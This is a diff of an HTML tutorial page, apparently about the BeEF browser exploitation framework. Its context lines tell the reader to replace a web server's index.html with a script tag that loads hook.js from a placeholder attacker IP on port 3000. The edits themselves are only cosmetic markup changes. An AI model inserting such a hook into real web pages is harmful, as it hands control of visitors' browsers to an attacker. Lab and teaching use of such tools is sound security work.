@@ -93,7 +93,7 @@
             <li>Go to /var/www/html/ to open index.html</li>
             <li>Make a backup of index.html, deleted all, insert the hook:
                 <br/>
-                <h4>This HTML file contains the BeEF Hook</h4>
+                <p>This HTML file contains the BeEF Hook</p>
                 Get your ip <b>ifconfig</b>
                 <br/>
                 <b><script src="http://<IP>:3000/hook.js"></script></b>
@@ -134,14 +134,6 @@
                 </li>
             </li>
             <li></li>
-            <li>
-            </li>
-            <li>
-                
-            </li>
-            <li>
-
-            </li>
         </ol>
 
 
